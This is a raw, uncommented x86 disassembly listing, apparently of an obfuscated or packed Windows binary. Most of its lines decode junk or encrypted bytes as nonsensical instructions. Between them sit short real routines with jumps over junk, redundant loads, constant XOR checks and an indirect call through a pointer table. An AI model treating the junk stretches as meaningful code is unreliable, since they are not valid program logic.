  41acbb:	push   0xfaba198d
  41acc0:	xchg   ebx,eax
  41acc1:	or     bh,0x3c
  41acc4:	adc    eax,0x6d788294
  41acc9:	and    BYTE PTR [ebp-0x7e],cl
  41accc:	jecxz  0x41ad44
  41acce:	jle    0x41acb1
  41acd0:	inc    esp
  41acd1:	das    
  41acd2:	in     eax,0xe6
  41acd4:	repz loope 0x41ac82
  41acd7:	(bad)  
  41acd8:	xlat   BYTE PTR ds:[ebx]
  41acd9:	in     eax,0x26
  41acdb:	dec    esp
  41acdc:	mov    cs,WORD PTR [ebx+ecx*2-0xc595657]
  41ace3:	inc    esi
  41ace4:	cs call 0xf708:0x4c096a4c
  41acec:	add    eax,0x3590ccff
  41acf1:	loop   0x41ad3e
  41acf3:	mov    esp,0x1187c57d
  41acf8:	sahf   
  41acf9:	enter  0x4fc5,0xb8
  41acfd:	es cwde 
  41acff:	fsubr  st,st(6)
  41ad01:	add    BYTE PTR [ebx],dl
  41ad03:	or     DWORD PTR [ebx+0x78],esi
  41ad06:	or     DWORD PTR [edi+0x5a],esp
  41ad09:	sbb    BYTE PTR [ebp+0x0],bh
  41ad0c:	dec    esi
  41ad0d:	sub    al,0xcc
  41ad0f:	adc    eax,0x7bcc2951
  41ad14:	mov    al,ds:0xbe9c2799
  41ad19:	jb     0x41ad09
  41ad1b:	outs   dx,DWORD PTR ds:[esi]
  41ad1c:	cmp    eax,0xc0c804b7
  41ad21:	pop    edx
  41ad22:	loopne 0x41ad9d
  41ad24:	push   esp
  41ad25:	pop    esp
  41ad26:	lods   eax,DWORD PTR ds:[esi]
  41ad27:	std    
  41ad28:	add    BYTE PTR [esi],bh
  41ad2a:	xchg   esp,eax
  41ad2b:	pop    ecx
  41ad2c:	xchg   edx,eax
  41ad2d:	out    0x6a,eax
  41ad2f:	test   BYTE PTR [ebx],0xeb
  41ad32:	mov    edx,0xd7ff090b
  41ad37:	dec    edi
  41ad38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad39:	in     eax,dx
  41ad3a:	mov    edx,edi
  41ad3c:	test   eax,0x877725a7
  41ad41:	shr    DWORD PTR [ebx+ebp*2+0x7],cl
  41ad45:	sbb    BYTE PTR [eax+0x48],0x51
  41ad49:	push   esi
  41ad4a:	mov    edx,0xc305e5d4
  41ad4f:	jge    0x41adb4
  41ad51:	dec    ebx
  41ad52:	or     ch,cl
  41ad54:	stc    
  41ad55:	test   BYTE PTR [esi-0x15d6ab55],dl
  41ad5b:	pop    ds
  41ad5c:	jmp    0xd06e:0xb76347b3
  41ad63:	fcmovnb st,st(5)
  41ad65:	inc    edi
  41ad66:	ret    
  41ad67:	adc    esi,DWORD PTR [edi-0xa]
  41ad6a:	sbb    bl,BYTE PTR [edx+0x4562e16c]
  41ad70:	or     BYTE PTR [edx],cl
  41ad72:	dec    ebx
  41ad73:	mov    al,ds:0x47e7f546
  41ad78:	adc    eax,DWORD PTR [esp+ecx*4-0x4e]
  41ad7c:	addr16 int 0xc0
  41ad7f:	dec    ecx
  41ad80:	sar    eax,0x7d
  41ad83:	mov    ecx,0xf907cbf7
  41ad88:	or     ah,BYTE PTR [eax-0x4d51e421]
  41ad8e:	inc    ecx
  41ad8f:	push   0x22
  41ad91:	mov    bl,0x96
  41ad93:	ins    BYTE PTR es:[edi],dx
  41ad94:	jbe    0x41adfd
  41ad96:	push   esp
  41ad97:	adc    bl,BYTE PTR [ebp+ebp*2+0x47b92cc4]
  41ad9e:	adc    al,0x36
  41ada0:	sahf   
  41ada1:	neg    ecx
  41ada3:	mov    al,0xe9
  41ada5:	xchg   esp,eax
  41ada6:	sub    BYTE PTR [esi],ah
  41ada8:	lock xor DWORD PTR [edx+0x4e],esp
  41adac:	sub    eax,0x93b90a6a
  41adb1:	stos   BYTE PTR es:[edi],al
  41adb2:	retf   
  41adb3:	in     al,dx
  41adb4:	aam    0xcb
  41adb6:	dec    ebp
  41adb7:	add    BYTE PTR [ebp+0x3f],0x93
  41adbb:	push   edi
  41adbc:	mov    ds:0x347a9db1,eax
  41adc1:	out    0x86,eax
  41adc3:	ror    BYTE PTR [esi],1
  41adc5:	inc    ebp
  41adc6:	mov    ?,WORD PTR [edi-0x3d]
  41adc9:	xchg   esp,eax
  41adca:	xor    eax,DWORD PTR [eax]
  41adcc:	pop    esi
  41adcd:	lock add dl,cl
  41add0:	mov    edi,0x3d62c7dd
  41add5:	jae    0x41adf5
  41add7:	mov    ebp,0x61bb4e7a
  41addc:	fbld   TBYTE PTR [esi+0x11]
  41addf:	xor    bl,BYTE PTR [edx+0x11d53c0]
  41ade5:	mov    DWORD PTR ds:0x17a8a77f,ebx
  41adeb:	sub    al,0x62
  41aded:	dec    DWORD PTR [ebp-0x56]
  41adf0:	out    0xc0,al
  41adf2:	imul   ebx,DWORD PTR [ecx+0x463b98b2],0x5c8ca646
  41adfc:	out    dx,eax
  41adfd:	fs scas eax,DWORD PTR es:[di]
  41ae00:	cmp    BYTE PTR [eax-0x4ba7a51f],al
  41ae06:	push   eax
  41ae07:	xor    edx,DWORD PTR [edx+0x7d]
  41ae0a:	dec    eax
  41ae0b:	xchg   DWORD PTR [edx],esp
  41ae0d:	cmp    BYTE PTR ds:0xfa0e1e05,ch
  41ae13:	adc    eax,0x797cd26f
  41ae18:	adc    esp,DWORD PTR [ebx+0x23aa1aae]
  41ae1e:	push   edx
  41ae20:	mov    BYTE PTR [ebx+0x618b491e],0xbf
  41ae27:	test   eax,0x4246b581
  41ae2c:	(bad)  
  41ae2d:	ret    0x4c5c
  41ae30:	pop    edi
  41ae31:	jbe    0x41ae62
  41ae33:	cmp    ebp,DWORD PTR [edi-0x41]
  41ae36:	xchg   BYTE PTR [edi+0x14],bh
  41ae39:	enter  0x8b64,0x10
  41ae3d:	mov    eax,ds:0x2834a3
  41ae42:	jmp    0x41ae06
  41ae44:	lahf   
  41ae45:	cdq    
  41ae46:	je     0x41ae86
  41ae48:	(bad)  
  41ae49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae4a:	xchg   edi,eax
  41ae4b:	cmp    DWORD PTR [esp+esi*2-0x50701e74],edx
  41ae52:	ret    
  41ae53:	scas   eax,DWORD PTR es:[edi]
  41ae54:	sti    
  41ae55:	sbb    dl,bl
  41ae57:	in     al,0x1c
  41ae59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae5a:	daa    
  41ae5b:	xor    al,0xf
  41ae5d:	cmp    dh,BYTE PTR [esi]
  41ae5f:	add    al,0x69
  41ae61:	push   cs
  41ae62:	or     ecx,0x2d
  41ae65:	loope  0x41ae91
  41ae67:	add    BYTE PTR [eax],al
  41ae69:	and    eax,0x6f90
  41ae6e:	mov    DWORD PTR [esp+0x30],eax
  41ae72:	mov    DWORD PTR [esp+0x10],0x1515
  41ae7a:	mov    eax,DWORD PTR [esp+0x10]
  41ae7e:	jmp    0x41b0db
  41ae83:	sub    al,0xff
  41ae85:	jmp    0xe1b3:0xbcbce956
  41ae8c:	in     al,0x38
  41ae8e:	xchg   edx,eax
  41ae8f:	dec    ecx
  41ae90:	or     dh,BYTE PTR [edx-0x3fce1c31]
  41ae96:	mov    esi,0xbebec235
  41ae9b:	es retf 0xc196
  41ae9f:	jecxz  0x41aea3
  41aea1:	loope  0x41aec6
  41aea3:	mov    cl,0x17
  41aea5:	mov    ebp,0xc9bf0ee6
  41aeaa:	mov    ds:0x6d2dbd7c,al
  41aeaf:	jl     0x41ae45
  41aeb1:	sti    
  41aeb2:	add    BYTE PTR [edi-0x31fc79ea],bl
  41aeb8:	hlt    
  41aeb9:	jg     0x41aea7
  41aebb:	shl    DWORD PTR [ebx],1
  41aebd:	and    eax,0xd48da3c3
  41aec2:	es pop ebp
  41aec4:	push   edx
  41aec5:	inc    edi
  41aec6:	cmp    al,0xe5
  41aec8:	ins    BYTE PTR es:[edi],dx
  41aec9:	mov    cl,0x6f
  41aecb:	test   eax,0x8e221304
  41aed0:	add    BYTE PTR [eax+0x61fcbd26],0x32
  41aed7:	add    al,0x3b
  41aed9:	loope  0x41ae8c
  41aedb:	ss dec ebp
  41aedd:	and    cl,al
  41aedf:	loopne 0x41af56
  41aee1:	xchg   esi,eax
  41aee2:	(bad)  
  41aee3:	repnz (bad) 
  41aee6:	pop    edx
  41aee7:	mov    edi,0x1d2cf32b
  41aeec:	pop    ebp
  41aeed:	adc    bh,BYTE PTR ds:0xc477a89
  41aef3:	push   esi
  41aef4:	add    BYTE PTR [eax],cl
  41aef6:	lds    ebp,FWORD PTR [ecx]
  41aef8:	les    ebp,FWORD PTR [esi]
  41aefa:	add    eax,0xfff39adb
  41aeff:	sbb    DWORD PTR [edi],ecx
  41af01:	pop    edx
  41af02:	adc    al,0x36
  41af04:	push   cs
  41af05:	repnz imul ebx,DWORD PTR [ebp-0x4f],0x898db1fc
  41af0d:	jp     0x41aecd
  41af0f:	les    ecx,FWORD PTR [eax-0x4c]
  41af12:	add    edx,DWORD PTR [esi+0x7d]
  41af15:	pop    edx
  41af16:	pop    esp
  41af17:	(bad)  
  41af18:	jl     0x41aed4
  41af1a:	sub    al,0x8a
  41af1c:	jmp    0x41af7c
  41af1e:	lock or al,0x2a
  41af21:	fnstenv [eax]
  41af23:	out    0x6,eax
  41af25:	std    
  41af26:	addr16 mov ebp,0x569ad087
  41af2c:	mov    ch,BYTE PTR ds:0xf1638cd3
  41af32:	adc    ch,BYTE PTR [edx-0x21eb31f7]
  41af38:	(bad)  
  41af39:	fst    DWORD PTR [esi]
  41af3b:	mov    ah,0xb7
  41af3d:	shl    al,1
  41af3f:	inc    ecx
  41af40:	(bad)  
  41af41:	push   cs
  41af42:	in     al,dx
  41af43:	aam    0xe6
  41af45:	fs mov esp,0x14084a61
  41af4b:	rcl    DWORD PTR [ebx-0x1a],1
  41af4e:	mov    eax,0x770098ba
  41af53:	mov    dl,0x3b
  41af55:	pushf  
  41af56:	icebp  
  41af57:	jns    0x41af64
  41af59:	leave  
  41af5a:	lahf   
  41af5b:	mov    gs,WORD PTR [ebp*2+0x2a9957fc]
  41af62:	dec    edi
  41af63:	(bad)  
  41af64:	out    dx,al
  41af65:	js     0x41afe6
  41af67:	scas   eax,DWORD PTR es:[edi]
  41af68:	enter  0x5e8f,0x43
  41af6c:	mov    esi,DWORD PTR [ebx-0x67]
  41af6f:	push   ss
  41af70:	xor    cl,BYTE PTR [ecx-0x2a498221]
  41af76:	clc    
  41af77:	add    al,0xa1
  41af79:	aad    0x6e
  41af7b:	aam    0x27
  41af7d:	(bad)  
  41af7e:	nop
  41af7f:	mov    dh,0x12
  41af81:	jo     0x41af46
  41af83:	stc    
  41af84:	mov    eax,ds:0xc1ddacff
  41af89:	mov    bh,0x93
  41af8b:	jno    0x41af89
  41af8d:	mov    ds:0x5c00f1dd,eax
  41af92:	iret   
  41af93:	sub    BYTE PTR [ecx],ah
  41af95:	inc    esi
  41af96:	jp     0x41af5e
  41af98:	rcl    BYTE PTR [edi-0x1749263f],cl
  41af9e:	xchg   ebp,eax
  41af9f:	mov    bh,0x5d
  41afa1:	dec    edi
  41afa2:	loop   0x41afe4
  41afa4:	mov    ebx,0x91f80e08
  41afa9:	dec    ebp
  41afaa:	fimul  WORD PTR [esp+ebp*4+0x1b]
  41afae:	retf   0x2720
  41afb1:	adc    esp,DWORD PTR [ebx+0x31574c0a]
  41afb7:	call   0x66df1e32
  41afbc:	sbb    al,BYTE PTR [esi-0x5]
  41afbf:	aas    
  41afc0:	inc    esp
  41afc1:	rol    bl,0xbe
  41afc4:	jp     0x41af8c
  41afc6:	xchg   ebp,eax
  41afc7:	in     eax,0xaf
  41afc9:	mov    ds:0x78493f25,al
  41afce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41afcf:	fst    QWORD PTR [esi+edx*1+0x6]
  41afd3:	mov    dh,0x7e
  41afd5:	jl     0x41aff5
  41afd7:	js     0x41b041
  41afd9:	test   ecx,ebp
  41afdb:	sti    
  41afdc:	add    esp,ebp
  41afde:	ds loopne 0x41afb9
  41afe1:	pop    ss
  41afe2:	sbb    esi,DWORD PTR [ebx-0xf]
  41afe5:	call   0xac69:0xa4bba85d
  41afec:	int3   
  41afed:	lds    eax,FWORD PTR [ecx+ecx*4+0x1a365ef4]
  41aff4:	cmc    
  41aff5:	dec    ebp
  41aff6:	xchg   DWORD PTR [ebp-0x4],ebx
  41aff9:	jns    0x41afe4
  41affb:	fmulp  st(6),st
  41affd:	mov    cl,al
  41afff:	lock cmp BYTE PTR ds:0xdb5e337d,bl
  41b006:	lds    esi,FWORD PTR [edx-0x65]
  41b009:	popf   
  41b00a:	cmp    DWORD PTR [ebx],0x1a70346f
  41b010:	mov    ah,0x97
  41b012:	or     cl,ch
  41b014:	mov    cl,0xea
  41b016:	and    DWORD PTR [ebx],0x5c53d6d
  41b01c:	mov    bl,0x33
  41b01e:	out    dx,al
  41b01f:	fistp  WORD PTR [ecx]
  41b021:	scas   al,BYTE PTR es:[edi]
  41b022:	adc    bh,al
  41b024:	into   
  41b025:	and    ebx,DWORD PTR [ecx+0x517951ac]
  41b02b:	lods   al,BYTE PTR ds:[esi]
  41b02c:	inc    eax
  41b02d:	pop    ebx
  41b02e:	pop    edi
  41b02f:	inc    ebx
  41b030:	push   ebx
  41b031:	out    0xad,eax
  41b033:	xchg   ecx,eax
  41b034:	sbb    DWORD PTR [esi+0x48],eax
  41b037:	repnz and BYTE PTR [edi+0x5b],al
  41b03b:	mov    eax,0xf3d95918
  41b040:	popf   
  41b041:	jbe    0x41b090
  41b043:	xchg   BYTE PTR [ebx],bh
  41b045:	mov    cs,WORD PTR [ebp-0x3b]
  41b048:	lds    ecx,FWORD PTR [ecx]
  41b04a:	jns    0x41b085
  41b04c:	pop    ebp
  41b04d:	cwde   
  41b04e:	cmp    BYTE PTR [eax+0x1b],ah
  41b051:	mov    BYTE PTR [esp+eax*2-0x78],al
  41b055:	sti    
  41b056:	pop    esp
  41b057:	xchg   edx,eax
  41b058:	scas   al,BYTE PTR es:[edi]
  41b059:	ret    0x3782
  41b05c:	xchg   edx,esp
  41b05e:	std    
  41b05f:	and    eax,0xf2dd9ead
  41b064:	add    DWORD PTR [edx+0xd],edi
  41b067:	sar    DWORD PTR [esi+0x31],0xd3
  41b06b:	cmp    BYTE PTR [eax+0x50],dh
  41b06e:	jne    0x41b00e
  41b070:	jns    0x41b0d5
  41b072:	in     al,0x3b
  41b074:	adc    al,0xd1
  41b076:	jnp    0x41b02a
  41b078:	bound  edi,QWORD PTR [esi+0x6f]
  41b07b:	push   esi
  41b07c:	mov    WORD PTR [esi+ebp*4],cs
  41b07f:	cli    
  41b080:	mov    esp,0x89be7e9b
  41b085:	push   ds
  41b086:	sbb    al,bl
  41b088:	cmp    ch,BYTE PTR [ebx+0x49e6c13e]
  41b08e:	call   0xc0b9:0x424ee53a
  41b095:	add    DWORD PTR [ecx+eiz*2-0x6f84a970],ebx
  41b09c:	push   es
  41b09d:	push   es
  41b09e:	loopne 0x41b044
  41b0a0:	or     eax,DWORD PTR [eax+ebp*4]
  41b0a3:	pop    ebx
  41b0a4:	data16 test al,0x72
  41b0a7:	xlat   BYTE PTR ds:[ebx]
  41b0a8:	and    BYTE PTR [edx-0x3e77230f],ch
  41b0ae:	in     al,0x84
  41b0b0:	adc    edx,DWORD PTR [eax]
  41b0b2:	push   es
  41b0b3:	fcmovb st,st(6)
  41b0b5:	xor    eax,0xa77a71cb
  41b0ba:	pop    edi
  41b0bb:	out    0xcb,eax
  41b0bd:	enter  0x6bf9,0x8f
  41b0c1:	mov    al,ds:0x5efcc450
  41b0c6:	mov    eax,0x72f8dda8
  41b0cb:	ds or  ch,dl
  41b0ce:	add    dl,BYTE PTR [ecx+0x40]
  41b0d1:	js     0x41b068
  41b0d3:	cmp    esi,DWORD PTR [ebx+0x42]
  41b0d6:	adc    al,0x79
  41b0d8:	addr16 jbe 0x41b0bc
  41b0db:	mov    ecx,DWORD PTR [esp+0x30]
  41b0df:	or     eax,0x7113
  41b0e4:	add    eax,0x3d6a
  41b0e9:	cmp    ecx,eax
  41b0eb:	je     0x41b438
  41b0f1:	mov    eax,DWORD PTR [esp+0x40]
  41b0f5:	mov    edx,DWORD PTR [esp+0x18]
  41b0f9:	mov    edi,DWORD PTR [esp+0x1c]
  41b0fd:	xor    ecx,ecx
  41b0ff:	shld   ecx,eax,0x2
  41b103:	shl    eax,0x2
  41b106:	xor    eax,ebx
  41b108:	xor    ecx,esi
  41b10a:	cmp    eax,edx
  41b10c:	jne    0x41b11a
  41b112:	cmp    ecx,edi
  41b114:	je     0x41b3f1
  41b11a:	mov    eax,DWORD PTR [esp+0x44]
  41b11e:	mov    eax,DWORD PTR [esp+0x44]
  41b122:	mov    eax,DWORD PTR [esp+0x44]
  41b126:	mov    ecx,DWORD PTR [esp+0x44]
  41b12a:	jmp    0x41b387
  41b12f:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b131:	lea    ecx,[ecx-0x67]
  41b134:	jnp    0x41b171
  41b136:	mov    bh,0x0
  41b138:	lods   al,BYTE PTR ds:[esi]
  41b139:	dec    esp
  41b13a:	xchg   edx,eax
  41b13b:	jge    0x41b0f7
  41b13d:	je     0x41b11c
  41b13f:	pop    esp
  41b140:	xor    eax,0xc235bec0
  41b145:	mov    esi,0x8f8915be
  41b14a:	mov    ah,BYTE PTR [edi]
  41b14c:	test   BYTE PTR [edx+0x2c],bh
  41b14f:	add    ah,dl
  41b151:	int    0xba
  41b153:	push   esi
  41b154:	xchg   edx,eax
  41b155:	mov    bl,0x66
  41b157:	jo     0x41b1b0
  41b159:	loope  0x41b1c3
  41b15b:	adc    al,0xbf
  41b15d:	rol    DWORD PTR [eax+0x2c],1
  41b160:	mov    edx,0x4bde16e
  41b165:	add    eax,0x9d194462
  41b16a:	jge    0x41b193
  41b16c:	int    0xd3
  41b16e:	sub    eax,DWORD PTR [ecx+0x7d]
  41b171:	test   eax,0x7e14586
  41b176:	clc    
  41b177:	or     al,0xe3
  41b179:	scas   eax,DWORD PTR es:[edi]
  41b17a:	mov    bh,0x44
  41b17c:	in     al,0xd0
  41b17e:	xor    BYTE PTR [esi-0x5b],bh
  41b181:	adc    dh,BYTE PTR [esi+0x35801f9a]
  41b187:	out    0x7c,al
  41b189:	mov    ebp,0xd2b3c531
  41b18e:	ret    
  41b18f:	test   DWORD PTR [esi+ebx*1+0x11],eax
  41b193:	dec    ebp
  41b194:	ror    DWORD PTR [edi],1
  41b196:	mov    ah,0xd6
  41b198:	fnsave [ebp-0x2bf647ef]
  41b19e:	push   edi
  41b19f:	dec    esp
  41b1a0:	or     BYTE PTR [ebx-0x45],dh
  41b1a3:	xchg   ebp,eax
  41b1a4:	cmp    DWORD PTR [ecx+0x40583964],0xd19373ec
  41b1ae:	aas    
  41b1af:	or     BYTE PTR [eax],dl
  41b1b1:	ja     0x41b17f
  41b1b3:	sar    BYTE PTR [ebx+edx*1+0x20430cc0],0x15
  41b1bb:	mov    ah,BYTE PTR [esi]
  41b1bd:	ret    0x8cc
  41b1c0:	jl     0x41b1c8
  41b1c2:	sbb    eax,0x63b34204
  41b1c7:	push   ds
  41b1c8:	shufps xmm1,XMMWORD PTR [edx+0x63a6fc78],0x44
  41b1d0:	xchg   ecx,eax
  41b1d1:	sti    
  41b1d2:	push   0xf94965b
  41b1d7:	jg     0x41b17e
  41b1d9:	adc    al,0x7c
  41b1db:	sub    DWORD PTR ds:0x4872ed4f,0xa539ff42
  41b1e5:	mov    dh,BYTE PTR [edi]
  41b1e7:	jmp    0x8bfe3e48
  41b1ec:	fmul   DWORD PTR [eax-0x4b]
  41b1ef:	loope  0x41b21f
  41b1f1:	sbb    eax,DWORD PTR [edx]
  41b1f3:	mov    DWORD PTR [esi+ecx*1+0x1b35d2ef],ecx
  41b1fa:	inc    edx
  41b1fb:	(bad)  
  41b1fc:	(bad)  
  41b1fd:	fiadd  WORD PTR [edx+0x50]
  41b200:	add    ecx,DWORD PTR [edi+eiz*2-0x73ae82ac]
  41b207:	lss    edi,FWORD PTR es:[edi]
  41b20b:	jl     0x41b1c9
  41b20d:	ret    0x88cc
  41b210:	xchg   edx,eax
  41b211:	lods   al,BYTE PTR ds:[esi]
  41b212:	fwait
  41b213:	inc    esi
  41b214:	sbb    DWORD PTR [eax+0x71],0xfffffffd
  41b218:	push   0x57
  41b21a:	jnp    0x41b22b
  41b21c:	dec    ecx
  41b21d:	mov    DWORD PTR [edx-0x3c],esi
  41b220:	add    BYTE PTR [eax+0x54eea060],0xf5
  41b227:	test   eax,0x522a3340
  41b22c:	std    
  41b22d:	es cli 
  41b22f:	mov    gs:0xc3215acc,eax
  41b235:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b236:	shl    ah,1
  41b238:	out    0x3e,al
  41b23a:	std    
  41b23b:	mov    al,ds:0x54447240
  41b240:	mov    ah,0xc4
  41b242:	outs   dx,DWORD PTR ds:[esi]
  41b243:	mov    eax,0xb92eaf0c
  41b248:	je     0x41b284
  41b24a:	pushf  
  41b24b:	jmp    0x97942597
  41b250:	cmp    al,0x15
  41b252:	xchg   ebx,eax
  41b253:	popa   
  41b254:	mov    edx,0x927b8344
  41b259:	xor    al,0xe2
  41b25b:	adc    al,0xd9
  41b25d:	repz icebp 
  41b25f:	outs   dx,DWORD PTR ds:[esi]
  41b260:	(bad)  
  41b261:	call   0x2ee19126
  41b266:	sbb    ecx,DWORD PTR [edi-0x33]
  41b269:	mov    al,0xb8
  41b26b:	dec    edx
  41b26c:	mov    cl,0x15
  41b26e:	pushf  
  41b26f:	aaa    
  41b270:	inc    dl
  41b272:	add    al,0x79
  41b274:	lds    ecx,FWORD PTR [edx-0x49465024]
  41b27a:	clc    
  41b27b:	mov    al,0x16
  41b27d:	adc    bh,ah
  41b27f:	out    0xf6,eax
  41b281:	xchg   ebp,eax
  41b282:	(bad)  
  41b284:	xlat   BYTE PTR ds:[ebx]
  41b285:	cmp    DWORD PTR [ebp+edi*2-0x76d8d9ea],0x5cb03b3c
  41b290:	dec    ebp
  41b291:	cmp    eax,0xc90f60f9
  41b296:	and    eax,0xaec8e720
  41b29b:	push   edx
  41b29c:	lahf   
  41b29d:	dec    ecx
  41b29e:	xlat   BYTE PTR ds:[ebx]
  41b29f:	and    al,0x30
  41b2a1:	inc    esi
  41b2a2:	add    BYTE PTR ds:0x48652979,al
  41b2a8:	ret    0x34ed
  41b2ab:	dec    ebx
  41b2ac:	push   0x3a
  41b2ae:	push   edi
  41b2af:	lock mov BYTE PTR ds:0x722f9f2e,dl
  41b2b6:	mov    ebx,0xbcba0c26
  41b2bb:	std    
  41b2bc:	test   DWORD PTR [eax],edx
  41b2be:	sbb    eax,0x225bc060
  41b2c3:	push   ss
  41b2c4:	mov    esi,0x3eaba404
  41b2c9:	scas   eax,DWORD PTR es:[edi]
  41b2ca:	dec    esi
  41b2cb:	dec    ebp
  41b2cc:	cmp    DWORD PTR [edx],esi
  41b2ce:	or     eax,0x780a8604
  41b2d3:	rcl    DWORD PTR [edi-0x6667f9d8],cl
  41b2d9:	adc    al,0xd3
  41b2db:	xor    BYTE PTR [edx-0x10],0xba
  41b2df:	mov    DWORD PTR [esi+0x400481bf],edi
  41b2e5:	lds    esi,FWORD PTR [edi+0x33738920]
  41b2eb:	ret    0x133
  41b2ee:	xchg   ebx,eax
  41b2ef:	test   esp,edx
  41b2f1:	in     eax,0x80
  41b2f3:	ficomp DWORD PTR [esi+esi*2+0x3]
  41b2f7:	jmp    0xfef:0x4799c780
  41b2fe:	cmp    eax,0x8e551f7d
  41b303:	adc    eax,0xa43be93c
  41b308:	les    esp,FWORD PTR [edx+edi*8-0x7a]
  41b30c:	adc    eax,0x124d5a86
  41b311:	fld    TBYTE PTR [esi]
  41b313:	add    BYTE PTR [ebp-0x5ef0a487],dh
  41b319:	mov    cl,0xa7
  41b31b:	cmovg  ebp,esi
  41b31e:	cli    
  41b31f:	mov    bh,0x2f
  41b321:	mov    al,0xd7
  41b323:	xor    BYTE PTR [esi+0x3dbc9381],dh
  41b329:	(bad)  
  41b32a:	ror    DWORD PTR [edi+0x28657b99],0xb0
  41b331:	adc    eax,0xd69eb1c3
  41b336:	ret    0x35db
  41b339:	pop    esp
  41b33a:	dec    edx
  41b33b:	(bad)  
  41b33c:	cli    
  41b33d:	mov    ch,0x6
  41b33f:	push   ecx
  41b340:	sbb    bh,dh
  41b342:	addr16 mov dh,0x8d
  41b345:	push   ds
  41b346:	sub    al,dh
  41b348:	sub    ecx,eax
  41b34a:	inc    eax
  41b34b:	mov    eax,ds:0x89e3faee
  41b350:	xchg   ecx,eax
  41b351:	pop    edi
  41b352:	dec    eax
  41b353:	sbb    DWORD PTR [edi],edi
  41b355:	gs test edi,0xb418ae10
  41b35c:	scas   eax,DWORD PTR es:[edi]
  41b35d:	xor    esi,edi
  41b35f:	loope  0x41b3d1
  41b361:	(bad)  
  41b362:	push   ecx
  41b363:	pusha  
  41b364:	fisub  DWORD PTR ss:[edx-0x1d310f40]
  41b36b:	cli    
  41b36c:	push   ebx
  41b36d:	in     eax,dx
  41b36e:	sbb    BYTE PTR [esi-0x5b],ah
  41b371:	jb     0x41b364
  41b373:	adc    ebx,ebx
  41b375:	lahf   
  41b376:	xchg   esi,eax
  41b377:	mov    bl,0xf9
  41b379:	mov    BYTE PTR [ecx+edx*4+0x58f68ee],al
  41b380:	jl     0x41b30c
  41b382:	mov    edi,0x2ba9ad85
  41b387:	xor    eax,0xa5069baf
  41b38c:	xor    ecx,0xfffffffe
  41b38f:	shr    eax,0x2
  41b392:	shl    ecx,0x1e
  41b395:	or     eax,ecx
  41b397:	xor    ecx,ecx
  41b399:	shld   ecx,eax,0x2
  41b39d:	shl    eax,0x2
  41b3a0:	xor    eax,ebx
  41b3a2:	xor    ecx,esi
  41b3a4:	cmp    eax,0xcb79b572
  41b3a9:	jne    0x41b3b7
  41b3af:	cmp    ecx,esi
  41b3b1:	je     0x41b438
  41b3b7:	mov    eax,DWORD PTR [esp+0x60]
  41b3bb:	cdq    
  41b3bc:	mov    eax,DWORD PTR [esp+0x60]
  41b3c0:	mov    ecx,edx
  41b3c2:	cdq    
  41b3c3:	shld   edx,eax,0x2
  41b3c7:	shr    ecx,0x1e
  41b3ca:	xor    edi,edi
  41b3cc:	shl    eax,0x2
  41b3cf:	or     eax,ecx
  41b3d1:	or     edx,edi
  41b3d3:	mov    ecx,edx
  41b3d5:	mov    edx,DWORD PTR [esp+0x18]
  41b3d9:	xor    eax,ebx
  41b3db:	xor    ecx,esi
  41b3dd:	mov    esi,DWORD PTR [esp+0x1c]
  41b3e1:	cmp    edx,eax
  41b3e3:	jne    0x41b3f1
  41b3e9:	cmp    esi,ecx
  41b3eb:	je     0x41b438
  41b3f1:	push   DWORD PTR ds:0x422798
  41b3f7:	push   DWORD PTR ds:0x42252c
  41b3fd:	mov    eax,ds:0x4226a8
  41b402:	mov    eax,DWORD PTR [eax+0x1a4]
  41b408:	push   DWORD PTR [eax]
  41b40a:	mov    eax,DWORD PTR [esp+0x78]
  41b40e:	call   eax
  41b410:	mov    ecx,DWORD PTR ds:0x4226a8
  41b416:	mov    ecx,DWORD PTR [ecx+0x1dc]
  41b41c:	mov    DWORD PTR [ecx],eax
  41b41e:	mov    eax,ds:0x4226a8
  41b423:	push   0x4
  41b425:	add    eax,0x1dc
  41b42a:	push   eax
  41b42b:	lea    eax,[esp+0x84]
  41b432:	push   eax
  41b433:	call   0x411c08
  41b438:	mov    eax,DWORD PTR [esp+0x7c]
  41b43c:	mov    eax,DWORD PTR [eax]
  41b43e:	pop    edi
  41b43f:	pop    esi
  41b440:	pop    ebx
  41b441:	mov    esp,ebp
  41b443:	pop    ebp
  41b444:	ret    0xc
  41b447:	push   ebp
  41b448:	mov    ebp,esp
  41b44a:	sub    esp,0x23c
  41b450:	push   ebx
  41b451:	cmp    DWORD PTR ds:0x428505,0x0
  41b458:	mov    DWORD PTR ds:0x4282ed,0x2d97
  41b462:	mov    ecx,DWORD PTR ds:0x428405
  41b468:	mov    ecx,DWORD PTR ds:0x4283d9
  41b46e:	not    ecx
  41b470:	jmp    0x41b4da
  41b475:	mov    eax,ds:0x428421
  41b47a:	cmp    DWORD PTR ds:0x428505,0x0
  41b481:	jge    0x41b4c9
  41b487:	push   0x73dd
  41b48c:	push   DWORD PTR [ebp-0x18]
  41b48f:	push   0x428293
  41b494:	push   DWORD PTR [ebp-0x10]
  41b497:	push   DWORD PTR [ebp-0x14]
  41b49a:	call   DWORD PTR ds:0x42e108
  41b4a0:	neg    ecx
  41b4a2:	movzx  ecx,WORD PTR ds:0x428301
  41b4a9:	sbb    ecx,DWORD PTR ds:0x4283f1
  41b4af:	mov    DWORD PTR ds:0x428301,ecx
  41b4b5:	and    ecx,DWORD PTR ds:0x428511
  41b4bb:	xor    ecx,ecx
  41b4bd:	or     ecx,DWORD PTR ds:0x428411
  41b4c3:	or     DWORD PTR ds:0x428485,ecx
  41b4c9:	adc    ecx,ecx
  41b4cb:	xor    ecx,ecx
  41b4cd:	movzx  ecx,BYTE PTR ds:0x4283b1
  41b4d4:	or     DWORD PTR ds:0x4283b9,ecx
  41b4da:	push   esi
  41b4db:	push   edi
  41b4dc:	cmp    DWORD PTR ds:0x42851d,0x0
  41b4e3:	mov    ecx,0x4e26
  41b4e8:	mov    DWORD PTR ds:0x428511,ebx
  41b4ee:	mov    DWORD PTR ds:0x4283bd,ecx
  41b4f4:	mov    DWORD PTR ds:0x42848d,edx
  41b4fa:	jmp    0x41b569
  41b4ff:	mov    DWORD PTR ds:0x428311,0x7065
  41b509:	cmp    DWORD PTR ds:0x42851d,0x0
  41b510:	jae    0x41b54d
  41b516:	push   0x1ec2
